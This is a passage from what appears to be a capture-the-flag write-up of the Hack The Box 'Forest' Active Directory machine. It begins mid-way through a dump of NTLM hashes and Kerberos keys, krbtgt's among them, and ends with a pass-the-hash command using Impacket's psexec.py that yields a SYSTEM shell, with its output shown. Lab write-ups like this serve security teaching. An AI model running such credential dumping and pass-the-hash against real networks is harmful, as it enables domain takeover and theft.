htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
Baudy:7601:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:79772f4d18f3f1394c384d189b2643b6:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:6f8ab2c7e297c3a11b31d0a3ba7e1118286008574182db0d90ef8bd8f96acd34
htb.local\sebastien:aes128-cts-hmac-sha1-96:35f41fce714e9a624e25a6411069e869
htb.local\sebastien:des-cbc-md5:529dc47a4cdcf1c2
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
Baudy:aes256-cts-hmac-sha1-96:315e03c3003a9dcb58d4154257c103c7b56d8a457b1adf45e6ca070d4655acfc
Baudy:aes128-cts-hmac-sha1-96:5b965da70c5e99403286b4cd082dcb93
Baudy:des-cbc-md5:7ab54032a89413b5
FOREST$:aes256-cts-hmac-sha1-96:1b0545134c844fd6bab1835986c37b31355ea73ab83a2a71dafb510d5e10da6b
FOREST$:aes128-cts-hmac-sha1-96:65aa3aa9d0324bc4933485944c3ad34e
FOREST$:des-cbc-md5:a2b3466e513868f8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

The LM:NT hash couple can then be reused with one of the many implementations of sysinternal's popular PSExec tool, one of which just so happens to exist within Impacket's examples folder:

```aaa
┌─[✗]─[baud@parrot]─[/opt/impacket/examples]
└──╼ $./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@forest
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on forest.....
[*] Found writable share ADMIN$
[*] Uploading file GymrwPrz.exe
[*] Opening SVCManager on forest.....
[*] Creating service yUcN on forest.....
[*] Starting service yUcN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```



